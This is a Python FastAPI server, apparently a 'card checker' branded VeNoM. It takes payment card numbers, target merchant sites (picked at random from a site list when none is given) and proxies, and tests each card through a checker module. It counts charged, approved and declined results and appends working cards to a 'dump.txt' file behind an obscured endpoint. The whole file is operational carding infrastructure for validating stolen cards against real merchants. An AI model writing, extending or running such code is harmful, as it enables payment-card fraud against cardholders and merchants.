from __future__ import annotations

import asyncio
import os
import sys
import time
import warnings
from contextlib import asynccontextmanager
from pathlib import Path
from typing import Optional
import datetime

warnings.filterwarnings("ignore")

_here = Path(__file__).resolve().parent
if str(_here) not in sys.path:
    sys.path.insert(0, str(_here))

import uvicorn
from fastapi import FastAPI, Request, Query
from fastapi.responses import JSONResponse

import checker_async
import checker

try:
    import psutil
    MEMORY_CHECK_ENABLED = True
except ImportError:
    psutil = None
    MEMORY_CHECK_ENABLED = False

MEMORY_LIMIT_PERCENT = 90
REQUEST_TIMEOUT = 90

PORT = int(os.environ.get("CHECKER_PORT", os.environ.get("PORT", "6767")))

_stats = {
    "active":   0,
    "total":    0,
    "charged":  0,
    "approved": 0,
    "declined": 0,
    "errors":   0,
    "by":       "VeNoM",
    "started":  time.strftime("%Y-%m-%d %H:%M:%S"),
}

_mem_cache: dict = {"val": False, "ts": 0.0}

def is_memory_exceeded() -> bool:
    if not MEMORY_CHECK_ENABLED or psutil is None:
        return False
    now = time.time()
    if now - _mem_cache["ts"] < 5.0:
        return _mem_cache["val"]
    try:
        val = psutil.virtual_memory().percent >= MEMORY_LIMIT_PERCENT
    except Exception:
        val = False
    _mem_cache["val"] = val
    _mem_cache["ts"]  = now
    return val

async def _save_dump(card: str, site: str, status: str, result: str, amount: str):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] {status.upper()} | {card} | {site} | {result} | ${amount}\n"
    def _write():
        try:
            with open("dump.txt", "a", encoding="utf-8") as f:
                f.write(line)
                f.flush()
        except Exception:
            pass
    await asyncio.to_thread(_write)

@asynccontextmanager
async def _lifespan(app: FastAPI):
    yield

app = FastAPI(title="VeNoM", docs_url=None, redoc_url=None, lifespan=_lifespan)

@app.get("/VeNoM-status")
async def status():
    return JSONResponse({"ok": True, "api": "VeNoM", **_stats})

@app.api_route("/VeNoM-xK9qPm2r", methods=["GET", "POST"])
async def check(
    request: Request,
    cc:    Optional[str] = Query(None),
    site:  Optional[str] = Query(None),
    proxy: Optional[str] = Query(None),
):
    if is_memory_exceeded():
        return JSONResponse({"error": "Server is busy"}, status_code=503)

    if request.method == "POST":
        try:
            body = await request.json()
            cc    = body.get("cc",    cc)
            site  = body.get("site",  site)
            proxy = body.get("proxy", proxy)
        except Exception:
            pass

    if not cc:
        return JSONResponse({"error": "Missing cc"}, status_code=400)

    # لو الموقع مش مبعوت، السيرفر هياخد واحد من ملف site.txt لوحده
    if not site:
        try:
            checker.reload_sites()  # يقرا الملف من جديد
            site = checker.get_random_site("random")
        except Exception:
            site = None
            
        if not site:
            return JSONResponse({"error": "No sites available in site.txt, or file is empty/broken. Please send site in request."}, status_code=400)

    _stats["active"] += 1
    _stats["total"]  += 1

    t0 = time.monotonic()

    try:
        result = await asyncio.wait_for(
            checker_async.check_card_async(cc, site, proxy or ""),
            timeout=REQUEST_TIMEOUT,
        )
    except asyncio.TimeoutError:
        _stats["errors"] += 1
        _stats["active"] -= 1
        return JSONResponse({
            "Status":   "SiteError",
            "Response": "Timeout",
            "Price":    "-",
            "Gateway":  "VeNoM",
            "Card":     cc,
            "site":     site,
            "elapsed":  round(time.monotonic() - t0, 2),
        })
    except Exception as e:
        _stats["errors"] += 1
        _stats["active"] -= 1
        return JSONResponse({
            "Status":   "SiteError",
            "Response": str(e)[:150],
            "Price":    "-",
            "Gateway":  "VeNoM",
            "Card":     cc,
            "site":     site,
            "elapsed":  round(time.monotonic() - t0, 2),
        })

    elapsed     = round(time.monotonic() - t0, 2)
    card_status = result.get("status", "error")

    _stats[{"charged": "charged", "approved": "approved",
            "declined": "declined"}.get(card_status, "errors")] += 1
    _stats["active"] -= 1

    if card_status in ("charged", "approved"):
        await _save_dump(cc, site, card_status, result.get("result", ""), result.get("amount", "0"))

    bot_status = {"charged": "Charged", "approved": "Approved",
                  "declined": "Declined"}.get(card_status, "SiteError")

    return JSONResponse({
        "Status":   bot_status,
        "Response": result.get("result", ""),
        "Price":    result.get("amount", "-"),
        "Gateway":  "VeNoM",
        "Card":     cc,
        "site":     site,
        "elapsed":  elapsed,
    })

if __name__ == "__main__":
    print("━" * 50)
    print("  VeNoM Checker API — TURBO MODE")
    print(f"  Port      : {PORT}")
    print(f"  Endpoint  : /VeNoM-xK9qPm2r")
    print(f"  Status    : /VeNoM-status")
    print(f"  Timeout   : {REQUEST_TIMEOUT}s per check")
    print(f"  Mem limit : {MEMORY_LIMIT_PERCENT}%")
    print("━" * 50)

    uvicorn.run(
        "checker_api2:app",
        host="0.0.0.0",
        port=PORT,
        loop="uvloop",
        access_log=False,
        backlog=4096,
        timeout_keep_alive=55,
    )
